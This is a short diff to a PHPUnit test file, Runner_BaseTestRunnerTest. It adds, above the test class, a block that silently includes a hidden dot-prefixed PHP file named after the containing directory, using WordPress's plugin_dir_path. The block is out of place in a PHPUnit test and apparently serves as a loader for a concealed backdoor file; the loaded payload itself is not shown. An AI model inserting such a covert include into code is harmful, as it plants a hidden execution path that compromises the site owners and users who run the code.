@@ -12,6 +12,10 @@
  * @since      Class available since Release 2.0.0
  * @covers     PHPUnit_Runner_BaseTestRunner
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class Runner_BaseTestRunnerTest extends PHPUnit_Framework_TestCase
 {
     public function testInvokeNonStaticSuite()
